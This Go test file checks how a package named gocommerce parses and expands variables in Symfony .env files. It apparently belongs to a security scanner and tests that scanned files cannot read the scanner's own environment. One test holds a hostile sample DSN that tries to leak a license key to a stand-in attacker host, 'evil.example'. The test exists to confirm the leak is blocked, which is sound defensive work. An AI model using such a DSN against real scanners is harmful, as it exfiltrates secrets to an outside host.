package gocommerce

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestSymfonyEnvVars(t *testing.T) {
	vars := symfonyEnvVars(`
# comment
DB_HOST=db.internal # trailing comment
DB_PORT="3307"
export DB_USERNAME=caseys
DB_PASSWORD='pa$$word'
DB_DATABASE=first
DB_DATABASE=last
#DB_DISABLED=nope
`)

	assert.Equal(t, "db.internal", vars["DB_HOST"])
	assert.Equal(t, "3307", vars["DB_PORT"])
	assert.Equal(t, "caseys", vars["DB_USERNAME"])
	assert.Equal(t, `pa\$\$word`, vars["DB_PASSWORD"])
	assert.Equal(t, "last", vars["DB_DATABASE"])
	assert.NotContains(t, vars, "DB_DISABLED")
}

func TestExpandSymfonyVars(t *testing.T) {
	vars := map[string]string{
		"DB_HOST":  "db.internal",
		"DB_PORT":  "3307",
		"PASS":     `pa\$\$word`,
		"INDIRECT": "${DB_HOST}",
		"LOOP":     "${LOOP}",
	}

	for _, tc := range []struct {
		name string
		in   string
		want string
	}{
		{"braces", "mysql://u@${DB_HOST}:${DB_PORT}/db", "mysql://u@db.internal:3307/db"},
		{"bare", "mysql://u@$DB_HOST/db", "mysql://u@db.internal/db"},
		{"nested", "${INDIRECT}", "db.internal"},
		{"default unset", "${DB_SOCKET:-/tmp/mysql.sock}", "/tmp/mysql.sock"},
		{"default set", "${DB_HOST:-localhost}", "db.internal"},
		{"assign default", "${DB_SOCKET:=/run/mysqld.sock}", "/run/mysqld.sock"},
		{"unknown", "mysql://u:${NOPE}@h/db", "mysql://u:@h/db"},
		{"literal from single quotes", "mysql://u:${PASS}@h/db", "mysql://u:pa$$word@h/db"},
		{"escaped dollar", `pa\$sword`, "pa$sword"},
		{"self reference", "${LOOP}", "${LOOP}"},
		{"no reference", "mysql://u:p@h:3306/db", "mysql://u:p@h:3306/db"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			assert.Equal(t, tc.want, expandSymfonyVars(tc.in, vars))
		})
	}
}

// A scanned .env is attacker-controlled input, so it may not read the scanner's
// own environment - see freshdesk 53553.
func TestExpandSymfonyVarsIgnoresProcessEnv(t *testing.T) {
	t.Setenv("DB_HOST", "10.0.0.9")
	t.Setenv("ECOMSCAN_KEY", "zz-license-key")

	assert.Equal(t, "db.internal", expandSymfonyVars("${DB_HOST}", map[string]string{"DB_HOST": "db.internal"}))
	assert.Equal(t, "", expandSymfonyVars("${ECOMSCAN_KEY}", nil))
	assert.Equal(t, "fallback", expandSymfonyVars("${ECOMSCAN_KEY:-fallback}", nil))
}

func TestSymfonyParseConfigKeepsProcessEnvOutOfDSN(t *testing.T) {
	t.Setenv("DATABASE_URL", "")
	t.Setenv("ECOMSCAN_KEY", "zz-license-key")

	write := func(t *testing.T, dsn string) string {
		t.Helper()
		p := filepath.Join(t.TempDir(), ".env")
		require.NoError(t, os.WriteFile(p, []byte("DATABASE_URL=\""+dsn+"\"\n"), 0o644))
		return p
	}

	// nothing is left to connect to when every field came from the environment
	cfg, err := symfonyParseConfig(write(t, "mysql://${ECOMSCAN_KEY}:x@${ECOMSCAN_KEY}.evil.example/owned"))
	assert.Error(t, err)
	assert.Nil(t, cfg)

	// and a DSN that does parse carries none of it
	cfg, err = symfonyParseConfig(write(t, "mysql://u:p@db.internal/shop_${ECOMSCAN_KEY}"))
	require.NoError(t, err)
	assert.Equal(t, "shop_", cfg.DB.Name)
	assert.NotContains(t, cfg.DB.DSN(), "zz-license-key")
}

func TestParseSymfonyDSNEmptyPort(t *testing.T) {
	db := parseSymfonyDSN("DATABASE_URL=mysql://caseys:s3cr3t@db.internal:/caseys_prod", "prod")
	assert.NotNil(t, db)
	assert.Equal(t, 3306, db.Port)
	assert.Equal(t, "caseys_prod", db.Name)
}
